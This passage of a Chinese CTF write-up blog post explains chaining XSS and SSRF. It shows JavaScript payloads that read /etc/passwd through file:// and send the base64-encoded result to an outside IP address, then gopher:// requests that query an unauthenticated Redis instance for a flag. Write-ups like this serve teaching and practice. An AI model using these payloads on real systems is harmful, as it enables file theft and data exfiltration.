+<p>同样有一个表单，结合文件名和表单内容，这个表单应该是拿来发出请求的，也就可能存在SSRF。首先，尝试一下读<code>/etc/passwd</code>,构造payload如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)&#123;</span><br><span class="line">   <span class="built_in">document</span>.location=<span class="string">'http://123.207.99.17/ssrf?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> formdata=<span class="keyword">new</span> FormData();</span><br><span class="line">formdata.append(<span class="string">'url'</span>,<span class="string">'file:///etc/passwd'</span>);</span><br><span class="line">xmlhttp.open(<span class="string">'POST'</span>,<span class="string">'request.php'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send(formdata);</span><br></pre></td></tr></table></figure></p>
+<p>得到的返回页面如下<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538382607573.png" alt="enter description here">成功拿到了<code>/etc/passwd</code>的内容，既然存在SSRF，那么就可以读任意完整文件了，这时候肯定是去读<code>config.php</code>了。内容如下<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538382785223.png" alt="enter description here"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// database config</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'xssrf'</span>);</span><br><span class="line">define(<span class="string">'DB_PASS'</span>, <span class="string">'xssrfmeplz'</span>);</span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'host=localhost'</span>);</span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'xssrf'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// redis config</span></span><br><span class="line">define(<span class="string">'REDIS_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'REDIS_PORT'</span>, <span class="number">25566</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// define flag</span></span><br><span class="line">define(<span class="string">'FLAG'</span>, <span class="string">'FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;'</span>);</span><br><span class="line"></span><br><span class="line">$c_hardness = <span class="number">5</span>; <span class="comment">// how many proof of work leading zeros</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到，<code>config.php</code>里有第二个flag，还告诉我们redis开在25566端口。这时候我们可以继续SSRF，用的是gopher打redis的套路。先构造如下payload<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)&#123;</span><br><span class="line">   <span class="built_in">document</span>.location=<span class="string">'http://123.207.99.17/ssrf?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> formdata=<span class="keyword">new</span> FormData();</span><br><span class="line">formdata.append(<span class="string">'url'</span>,<span class="string">'gopher://127.0.0.1:25566/_config%20get%20*%0a'</span>);</span><br><span class="line">xmlhttp.open(<span class="string">'POST'</span>,<span class="string">'request.php'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send(formdata);</span><br></pre></td></tr></table></figure></p>
+<p>打到这个页面<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538383275676.png" alt="enter description here">说明的确存在redis未授权访问。然后，看看有哪些key:<code>formdata.append(&#39;url&#39;,&#39;gopher://127.0.0.1:25566/_keys%20*%0a&#39;);</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1538383374028.png" alt="enter description here">有一个叫flag的key，然后尝试去读：<code>formdata.append(&#39;url&#39;,&#39;gopher://127.0.0.1:25566/_get%20flag%0a&#39;);</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1538383473325.png" alt="enter description here">WRONGTYPE，然后看看flag是什么type，<code>formdata.append(&#39;url&#39;,&#39;gopher://127.0.0.1:25566/_type%20flag%0a&#39;);</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1538383592913.png" alt="enter description here">flag是list类型，用lrange可以把指定范围的list打印出来，不过超了也没关系，所以直接取个10000免得没读完<code>formdata.append(&#39;url&#39;,&#39;gopher://127.0.0.1:25566/_lrange%20flag%200%2010000%0a&#39;);</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1538383827792.png" alt="enter description here">可以看到，得到的是一个逆序的flag，通过简单的编辑器再加上python处理一下即可。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538383889838.png" alt="enter description here"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+            <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/20/命令执行技巧/" rel="next" title="命令执行技巧">
+                <i class="fa fa-chevron-left"></i> 命令执行技巧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/04/Redis_Getshell的几种姿势/" rel="prev" title="Redis_Getshell的几种姿势">
+                Redis_Getshell的几种姿势 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
